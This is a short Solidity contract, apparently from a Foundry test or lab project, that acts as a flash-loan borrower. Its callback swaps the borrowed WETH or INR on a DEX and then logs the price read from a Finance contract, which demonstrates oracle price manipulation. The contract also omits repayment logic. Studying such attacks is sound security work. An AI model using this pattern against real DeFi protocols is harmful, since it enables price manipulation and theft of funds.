//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "src/interfaces/IERC3156FlashBorrower.sol";
import {DEX} from "src/DEX.sol";
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
import {console} from "forge-std/Test.sol";
import {Finance} from "src/Finance.sol";

contract INR_PRICE_MANIPULATION is IERC3156FlashBorrower{
    uint256 public lastWethLoanReceived;
    uint256 public lastInrLoanReceived;
    address WETH;
    address INR;
    DEX dex;
    Finance finance;
    constructor(address _weth,address _inr,address _dex,address _finance){
        WETH=_weth;
        INR=_inr;
        dex=DEX(_dex);
        finance=Finance(_finance);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        if(token==WETH){
            lastWethLoanReceived=amount;
        }else if(token==INR){
            lastInrLoanReceived=amount;
        }
        IERC20(token).transfer(address(dex), amount);
        dex.swap(token, amount, 0, address(this));
        (uint256 _wethprice,uint256 _inrPrice)=finance.getPrice();
        console.log("WETH PRICE IN INR :",_wethprice);
        return bytes32(data);
    } 
}